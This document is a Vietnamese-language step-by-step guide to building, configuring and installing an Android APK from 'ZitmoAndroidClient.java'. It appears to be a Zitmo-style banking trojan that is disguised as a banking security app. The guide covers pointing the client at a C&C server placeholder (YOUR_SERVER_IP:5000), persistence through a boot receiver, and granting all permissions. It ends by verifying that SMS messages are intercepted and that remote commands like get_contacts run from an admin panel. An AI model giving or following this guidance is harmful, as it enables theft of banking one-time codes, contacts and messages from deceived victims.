# Hướng dẫn xây dựng APK cho Zitmo Android Client

Tài liệu này cung cấp các bước cụ thể để xây dựng APK từ mã nguồn `ZitmoAndroidClient.java` đã cung cấp.

## Yêu cầu
- Android Studio
- JDK 8 trở lên
- Thiết bị Android thật hoặc máy ảo

## Các bước thực hiện

### 1. Tạo project Android mới

1. Mở Android Studio
2. Chọn `File > New > New Project...`
3. Chọn template "Empty Views Activity"
4. Cấu hình project:
   - Name: Banking Security
   - Package name: com.research.banking
   - Language: Java
   - Minimum SDK: API 21 (Android 5.0)
   - Build configuration language: Groovy DSL
5. Nhấn "Finish"

### 2. Thêm các thư viện cần thiết

Mở file `app/build.gradle` và thêm các thư viện trong phần `dependencies`:

```gradle
dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.9.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
    implementation 'androidx.cardview:cardview:1.0.0'
    // ... các dependencies mặc định khác
}
```

### 3. Thêm các file mã nguồn và tài nguyên

1. Thay thế nội dung file `MainActivity.java` bằng class `MainActivity` từ file `ZitmoAndroidClient.java`
2. Tạo các class Java mới cho các thành phần:
   - `SMSReceiver.java` - copy từ class `SMSReceiver` trong `ZitmoAndroidClient.java`
   - `BootReceiver.java` - copy từ class `BootReceiver` trong `ZitmoAndroidClient.java`
   - `ZitmoService.java` - copy từ class `ZitmoService` trong `ZitmoAndroidClient.java`
   - `ZitmoUtils.java` - copy từ class `ZitmoUtils` trong `ZitmoAndroidClient.java`

3. Thay thế file `AndroidManifest.xml` bằng file đã cung cấp

4. Thêm layout và drawable:
   - Thay thế file `res/layout/activity_main.xml` bằng file `activity_main.xml` đã cung cấp
   - Tạo file drawable mới `res/drawable/ic_secure.xml` với nội dung từ file `ic_secure.xml` đã cung cấp

5. Thêm strings vào `res/values/strings.xml`:

```xml
<resources>
    <string name="app_name">Bảo Mật Ngân Hàng</string>
</resources>
```

### 4. Cấu hình URL máy chủ C&C

Mở file `ZitmoUtils.java` và cập nhật URL máy chủ C&C:

```java
private static final String SERVER_URL_DEFAULT = "http://YOUR_SERVER_IP:5000";
```

Thay `YOUR_SERVER_IP` bằng địa chỉ IP hoặc tên miền của máy chủ C&C.

### 5. Xây dựng APK

1. Đảm bảo rằng Gradle sync đã hoàn tất (Android Studio sẽ tự động thực hiện khi bạn thay đổi file `build.gradle`)
2. Chọn `Build > Build Bundle(s) / APK(s) > Build APK(s)`
3. Đợi quá trình xây dựng hoàn tất
4. Android Studio sẽ hiển thị thông báo khi APK được tạo thành công. Nhấn "locate" để mở thư mục chứa file APK

APK được tạo sẽ nằm trong thư mục: `app/build/outputs/apk/debug/app-debug.apk`

### 6. Cài đặt APK trên thiết bị

1. Chuyển file APK đến thiết bị Android (qua USB, email, cloud storage, v.v.)
2. Trên thiết bị Android, mở Settings > Security
3. Bật "Unknown Sources" hoặc "Install unknown apps" (tùy thuộc vào phiên bản Android)
4. Mở file APK và nhấn "Install"
5. Mở ứng dụng sau khi cài đặt xong
6. Cấp tất cả các quyền được yêu cầu
7. Nhấn "Kích hoạt ngay" để khởi động dịch vụ

## Xác minh APK hoạt động

1. Khởi động máy chủ C&C trên máy tính của bạn
2. Mở bảng điều khiển admin tại `http://YOUR_SERVER_IP:5000/admin`
3. Kiểm tra tab "Thiết bị" để xem thiết bị Android của bạn đã đăng ký thành công hay chưa
4. Thử gửi tin nhắn SMS đến thiết bị và kiểm tra tab "SMS đã chặn" để xem tin nhắn đã được chặn thành công hay chưa
5. Thử gửi lệnh đến thiết bị (như `get_contacts`) và kiểm tra xem lệnh có được thực thi thành công hay không
